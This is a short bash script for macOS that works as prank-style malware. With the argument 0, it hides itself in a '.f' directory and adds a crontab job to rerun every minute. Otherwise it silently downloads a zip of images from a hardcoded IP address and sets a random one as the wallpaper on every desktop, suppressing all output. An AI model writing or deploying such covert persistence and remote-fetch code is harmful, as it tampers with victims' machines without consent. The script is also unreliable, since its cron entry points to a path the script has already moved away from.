#! /bin/bash
function g {

	
 	cd .f/
	curl "http://104.236.151.159/b.zip" -o "b.zip" &> /dev/null
	unzip -o "b.zip" &>/dev/null
	wd=$(pwd)
	# echo $wd
	imgs=()
	ls | while read -r FILE &>/dev/null
	do
	    mv -v "$FILE" `echo $FILE | tr ' ' '_' ` &> /dev/null
	done
	for i in $(ls $wd | grep '[0-9]'); do
		imgs+=($i)
	done
	count=${#imgs[@]}
	rnum=$(awk 'BEGIN{srand();print int(rand()*('"$count"'))}')
	# echo $rnum
	img=$(echo $wd'/'${imgs[$rnum]})
	osascript -e 'tell application "System Events" 
		set desktopCount to count of desktops 
		repeat with desktopNumber from 1 to desktopCount 
			tell desktop desktopNumber 
				set picture to "'"$img"'" 
			end tell 
		end repeat 
	end tell'

	unset imgs
}

function init {
	# echo $0
	mkdir ".f" &> /dev/null
	mv $0 ".f/$1"
	fil=$(echo $(pwd)/$0)
	crontab -l > crtb
	echo "*/01 * * * * $fil" >> crtb
	crontab crtb
	rm crtb
}
if [ "$1"  =  0 ]; then
	init
else 
	g
fi